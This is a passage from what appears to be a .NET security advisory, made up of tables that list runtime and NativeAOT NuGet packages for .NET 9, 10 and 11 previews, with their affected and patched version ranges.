>= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.linux-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-arm) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.linux-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.linux-bionic-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-bionic-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.linux-bionic-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-bionic-x64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.linux-musl-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-musl-arm) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.linux-musl-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-musl-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.linux-musl-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-musl-x64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.linux-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-x64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.osx-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.osx-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.osx-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.osx-x64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.win-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.win-x64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.win-x86) | >= 9.0.0, < 9.0.22 | 9.0.22\n\n### .NET 10\n\nPackage name | Affected version | Patched version\n------------ | ---------------- | ---------------\n[Microsoft.DotNet.ILCompiler](https://www.nuget.org/packages/Microsoft.DotNet.ILCompiler) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.android-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.android-arm) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.android-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.android-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.android-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.android-x64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.ios-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.ios-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-x64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-arm) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-x64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-arm) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-x64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-x64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-x64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.osx-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.osx-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.osx-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.osx-x64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.tvos-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.tvos-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-x64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.win-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.win-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.win-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.win-x64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.NativeAOT.win-x86](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.win-x86) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.Mono.android-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.android-arm) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.Mono.android-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.android-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.Mono.android-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.android-x64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.Mono.android-x86](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.android-x86) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.Mono.browser-wasm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.browser-wasm) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.Mono.ios-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.ios-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.Mono.iossimulator-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.iossimulator-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.Mono.iossimulator-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.iossimulator-x64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.Mono.maccatalyst-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.maccatalyst-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.Mono.maccatalyst-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.maccatalyst-x64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.Mono.multithread.browser-wasm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.multithread.browser-wasm) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.Mono.tvos-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.tvos-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.Mono.tvossimulator-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.tvossimulator-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.Mono.tvossimulator-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.tvossimulator-x64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.Mono.wasi-wasm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.wasi-wasm) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.android-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.android-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.android-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.android-x64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.linux-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-arm) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.linux-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.linux-bionic-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-bionic-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.linux-bionic-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-bionic-x64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.linux-musl-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-musl-arm) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.linux-musl-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-musl-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.linux-musl-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-musl-x64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.linux-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-x64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.osx-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.osx-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.osx-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.osx-x64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.win-arm64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.win-x64) | >= 10.0.0, < 10.0.14 | 10.0.14\n[Microsoft.NETCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.win-x86) | >= 10.0.0, < 10.0.14 | 10.0.14\n\n### .NET 11 previews\n\nPackage name | Affected version | Patched version\n------------ | ---------------- | ---------------\n[Microsoft.DotNet.ILCompiler](https://www.nuget.org/packages/Microsoft.DotNet.ILCompiler) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.android-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.android-arm) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.android-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.android-arm64) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.android-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.android-x64) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.ios-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.ios-arm64) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-arm64) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-x64) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-arm) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-arm64) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm64) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-x64) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-arm) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-arm64) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-x64) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-x64) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-arm64) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-x64) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.osx-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.osx-arm64) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.osx-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.osx-x64) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.tvos-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.tvos-arm64) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-arm64) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-x64) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.win-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.win-arm64) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.win-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.win-x64) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.NativeAOT.win-x86](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.win-x86) | >= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.Mono.android-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.android-arm) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.Mono.android-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.android-arm64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.Mono.android-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.android-x64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.Mono.android-x86](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.android-x86) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.Mono.browser-wasm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.browser-wasm) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.Mono.ios-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.ios-arm64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.Mono.iossimulator-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.iossimulator-arm64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.Mono.iossimulator-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.iossimulator-x64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.Mono.maccatalyst-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.maccatalyst-arm64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.Mono.maccatalyst-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.maccatalyst-x64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.Mono.multithread.browser-wasm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.multithread.browser-wasm) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.Mono.tvos-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.tvos-arm64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.Mono.tvossimulator-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.tvossimulator-arm64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.Mono.tvossimulator-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.tvossimulator-x64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.Mono.wasi-wasm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.wasi-wasm) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.android-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.android-arm) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.android-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.android-arm64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.android-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.android-x64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.browser-wasm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.browser-wasm) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.ios-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.ios-arm64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.iossimulator-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.iossimulator-arm64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.iossimulator-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.iossimulator-x64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.linux-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-arm) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.linux-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-arm64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.linux-bionic-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-bionic-arm64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.linux-bionic-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-bionic-x64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.linux-musl-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-musl-arm) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.linux-musl-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-musl-arm64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.linux-musl-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-musl-x64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.linux-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-x64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.maccatalyst-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.maccatalyst-arm64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.maccatalyst-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.maccatalyst-x64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.osx-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.osx-arm64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.osx-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.osx-x64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.tvos-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.tvos-arm64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.tvossimulator-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.tvossimulator-arm64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 11.0.0-rc.3.26522.148\n[Microsoft.NETCore.App.Runtime.tvossimulator-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.tvossimulator-x64) | >= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148 | 